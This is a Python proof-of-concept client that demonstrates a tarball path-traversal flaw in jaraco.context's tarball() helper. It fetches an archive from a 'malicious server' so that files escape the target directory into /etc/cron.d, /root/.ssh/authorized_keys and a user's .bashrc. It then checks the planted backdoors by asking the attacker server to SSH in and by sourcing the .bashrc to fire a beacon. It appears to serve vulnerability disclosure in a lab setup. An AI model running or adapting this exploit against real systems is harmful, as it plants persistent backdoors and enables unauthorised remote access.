#!/usr/bin/env python3
"""
Victim client that demonstrates the tarball path traversal.

Uses jaraco.context.tarball() to fetch from a malicious server,
triggering the strip_first_component vulnerability.
"""

import os
import sys
import time
import urllib.request
import subprocess

SERVER_HOST = os.environ.get('SERVER_HOST', 'server')
SERVER_PORT = os.environ.get('SERVER_PORT', '8080')

TARGET_DIRS = ["/etc/cron.d", "/root/.ssh", "/home/victim"]


def setup_environment():
    """Create target directories."""
    print("[VICTIM] Creating target directories...")
    for d in TARGET_DIRS:
        os.makedirs(d, exist_ok=True)


def wait_for_server(host, port, timeout=30):
    """Wait for the malicious server to be ready."""
    import socket
    print(f"[VICTIM] Waiting for server {host}:{port}...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((host, int(port))) == 0:
                sock.close()
                print("[VICTIM] Server is up!")
                return True
            sock.close()
        except:
            pass
        time.sleep(1)
    return False


def run_attack(scenario):
    """Execute the tarball path traversal attack."""
    # Import here to use the installed setuptools
    from jaraco.context import tarball

    targets = {
        'cron': '/etc/cron.d/backdoor',
        'ssh': '/root/.ssh/authorized_keys',
        'bashrc': '/home/victim/.bashrc',
    }
    target = targets[scenario]

    print(f"\n{'='*60}")
    print(f"EXECUTING ATTACK: {scenario.upper()}")
    print(f"{'='*60}")

    # Set scenario on server
    try:
        urllib.request.urlopen(f"http://{SERVER_HOST}:{SERVER_PORT}/scenario/{scenario}")
    except:
        pass
    time.sleep(0.5)

    url = f"http://{SERVER_HOST}:{SERVER_PORT}/package.tar.gz"
    print(f"\n[VICTIM] Fetching tarball from: {url}")
    print(f"[VICTIM] Expected extraction to: /tmp/safe_directory/")
    print(f"[VICTIM] Actual target: {target}")
    print()

    try:
        # This is what a legitimate user might do - extract to a "safe" directory
        with tarball(url, target_dir="/tmp/safe_directory") as extracted:
            print(f"[VICTIM] Extraction returned: {extracted}")
            print(f"[VICTIM] Contents of {extracted}:")
            if os.path.exists(extracted):
                for item in os.listdir(extracted):
                    print(f"         - {item}")
            else:
                print("         (directory was cleaned up)")
    except Exception as e:
        print(f"[VICTIM] Exception: {e}")
        # Vulnerability might have triggered anyway

    print()

    # Check if the exploit worked
    if os.path.exists(target):
        print(f"[EXPLOITED] File written to: {target}")
        print()
        print("[FILE CONTENTS]")
        print("-" * 40)
        with open(target, 'r') as f:
            print(f.read())
        print("-" * 40)
        return True
    else:
        print(f"[FAILED] Target not created: {target}")
        return False


def validate():
    """Validate attack impact."""
    print(f"\n{'='*60}")
    print("VALIDATION")
    print(f"{'='*60}")

    # SSH validation - ask server to SSH in
    if os.path.exists("/root/.ssh/authorized_keys"):
        print("\n[SSH] authorized_keys exists:")
        with open("/root/.ssh/authorized_keys") as f:
            content = f.read()
            print(content[:200] if len(content) > 200 else content)
        print("\n[*] Asking attacker server to SSH in...")
        try:
            resp = urllib.request.urlopen(
                f"http://{SERVER_HOST}:{SERVER_PORT}/validate/ssh",
                timeout=15
            )
            result = resp.read().decode()
            if "SSH_OK" in result:
                print("[!] ATTACKER SUCCESSFULLY SSH'd INTO VICTIM!")
            else:
                print(f"[-] SSH validation response: {result[:200]}")
        except Exception as e:
            print(f"[-] SSH validation failed: {e}")

    # Cron validation
    if os.path.exists("/etc/cron.d/backdoor"):
        print("\n[CRON] backdoor cron job installed:")
        with open("/etc/cron.d/backdoor") as f:
            print(f.read())

    # Bashrc validation - trigger the beacon
    if os.path.exists("/home/victim/.bashrc"):
        print("\n[BASHRC] backdoor exists, triggering beacon...")
        try:
            subprocess.run(
                ["bash", "-c", "source /home/victim/.bashrc"],
                capture_output=True,
                timeout=5
            )
            time.sleep(2)
            print("[*] Check server /status for beacon callback")
        except Exception as e:
            print(f"[-] Bashrc trigger failed: {e}")


def main():
    print("=" * 60)
    print("TARBALL PATH TRAVERSAL ATTACK")
    print("jaraco/context.py strip_first_component bypass")
    print("=" * 60)
    print()
    print(f"Server: {SERVER_HOST}:{SERVER_PORT}")
    print()

    setup_environment()

    if not wait_for_server(SERVER_HOST, int(SERVER_PORT)):
        print("[VICTIM] Server not reachable")
        sys.exit(1)

    time.sleep(1)

    results = {}
    for scenario in ['cron', 'ssh', 'bashrc']:
        results[scenario] = run_attack(scenario)
        time.sleep(1)

    # Summary
    print()
    print("=" * 60)
    print("ATTACK SUMMARY")
    print("=" * 60)
    for scenario, success in results.items():
        status = "[EXPLOITED]" if success else "[FAILED]"
        print(f"  {status} {scenario}")

    # Validate the attacks worked
    validate()

    print()
    print("=" * 60)
    print("COMPLETE")
    print("=" * 60)

    return 0 if any(results.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
